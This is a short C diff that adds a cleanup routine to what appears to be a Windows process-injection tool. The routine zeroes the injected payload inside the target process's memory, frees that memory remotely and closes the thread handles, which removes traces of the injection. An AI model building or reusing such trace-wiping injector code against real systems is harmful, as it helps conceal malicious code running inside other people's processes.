@@ -136,3 +136,28 @@ int		summonExecuterThread(LPSECURITY_ATTRIBUTES securityAttr, SIZE_T stackSize, 
 
 	return EXIT_SUCCESS;
 }
+
+void		cleanUp(t_list_infos *processesList, char* payload, SIZE_T payloadSize) {
+	if (processesList->choosenProcess) {
+		CloseHandle(processesList->choosenProcess->HThread);
+		memset(payload, 0x00, payloadSize);
+		while(!(WriteProcessMemory(
+			processesList->choosenProcess->HProcess,
+			processesList->choosenProcess->VMPointer,
+			payload,
+			payloadSize,
+			&(processesList->choosenProcess->dataWritten)
+		)));
+		while (!(VirtualFreeEx(processesList->choosenProcess->HProcess, processesList->choosenProcess->VMPointer, 0, MEM_RELEASE)));
+
+	}
+
+	t_pinfo	*tmp;
+
+	while(processesList->head) {
+		tmp = processesList->head;
+		processesList->head = processesList->head->next;
+		CloseHandle(tmp->HProcess);
+		free(tmp);
+	}
+}
